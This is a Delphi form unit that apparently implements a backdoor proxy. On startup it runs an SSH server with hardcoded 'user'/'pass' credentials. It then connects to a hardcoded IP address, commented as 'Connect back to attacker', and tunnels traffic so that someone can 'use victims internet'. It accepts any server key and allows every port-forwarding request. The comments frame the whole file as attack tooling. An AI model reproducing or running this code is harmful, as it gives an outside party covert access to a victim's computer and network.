unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, ScSSHClient, ScSSHChannel,
  ScBridge, ScSSHServer, Vcl.Samples.Spin, Vcl.ExtCtrls, ScUtils, ScSSHUtils;

type
  TForm1 = class(TForm)
    Memo1: TMemo;
    ScSSHServer1: TScSSHServer;
    ScMemoryStorage1: TScMemoryStorage;
    ScSSHClient1: TScSSHClient;
    ScSSHChannel1: TScSSHChannel;
    procedure FormCreate(Sender: TObject);
    procedure ScSSHServer1AfterClientConnect(Sender: TObject;
      ClientInfo: TScSSHClientInfo);
    procedure ScSSHServer1AfterShellDisconnect(Sender: TObject;
      ClientInfo: TScSSHClientInfo);
    procedure ScSSHServer1RemotePortForwardingRequest(Sender: TObject;
      ClientInfo: TScSSHClientInfo; const Host: string; const Port: Integer;
      var Allow: Boolean);
    procedure ScSSHClient1ServerKeyValidate(Sender: TObject;
      NewServerKey: TScKey; var Accept: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
var
  Key: TScKey;
  NewKeyname: string;
  User: TScUser;
begin
  NewKeyname := 'key1';
  Key := TScKey.Create(ScMemoryStorage1.Keys);
  Key.KeyName := NewKeyname;
  Key.Generate(aaRSA, 2048);

  // Create and add the user
  User := TScUser.Create(ScMemoryStorage1.Users);
  User.UserName := 'user';
  User.Password := 'pass';
  User.Authentications := [uaPassword];

  // Setup SSH Server
  with ScSSHServer1 do
  begin
    Port := 3434;
    KeyNameRSA := NewKeyname;
    Active := true;
  end;

  // SSH Server is NOW STARTED!
  self.Memo1.Lines.Add('SSH Server Active On port: ' +
    inttostr(self.ScSSHServer1.Port));

  // setup our own SSH Tunnel so we can use victims internet...
  try
    // Connect back to attacker
    ScSSHClient1.HostName := '167.224.235.47';
    ScSSHClient1.Port := 3434;
    ScSSHClient1.User := 'user';
    ScSSHClient1.Password := 'pass';
    ScSSHClient1.Connect;

    // Now request forwarding this Computers Internet as a proxy back through The SSH server...
    ScSSHChannel1.GatewayPorts := true;
    ScSSHChannel1.Remote := False;
    ScSSHChannel1.Dynamic := False;
    ScSSHChannel1.Direct := true;
    ScSSHChannel1.SourcePort := 5933; // Port you'll connect to locally
    ScSSHChannel1.DestHost := '127.0.0.1';
    ScSSHChannel1.DestPort := 5933;
    ScSSHChannel1.Connect;
  except
    on E: Exception do
      Memo1.Lines.Add('Error: ' + E.Message);
  end;
end;

procedure TForm1.ScSSHClient1ServerKeyValidate(Sender: TObject;
  NewServerKey: TScKey; var Accept: Boolean);
begin
  // just accept any key presented by the SSH Server...
  Accept := true;
end;

procedure TForm1.ScSSHServer1AfterClientConnect(Sender: TObject;
  ClientInfo: TScSSHClientInfo);
begin
  self.Memo1.Lines.Add('Client Connected From IP: ' +
    ClientInfo.TCPConnection.GetRemoteIP);
end;

procedure TForm1.ScSSHServer1AfterShellDisconnect(Sender: TObject;
  ClientInfo: TScSSHClientInfo);
begin
  self.Memo1.Lines.Add('Client Disconnected From IP: ' +
    ClientInfo.TCPConnection.GetRemoteIP);
end;

procedure TForm1.ScSSHServer1RemotePortForwardingRequest(Sender: TObject;
  ClientInfo: TScSSHClientInfo; const Host: string; const Port: Integer;
  var Allow: Boolean);
begin
  // Just allow all port forwarding requests...
  Allow := true;
  self.Memo1.Lines.Add('Client: ' + ClientInfo.TCPConnection.GetRemoteIP +
    ' Requesting Port Forward on port: ' + inttostr(Port));
end;

end.
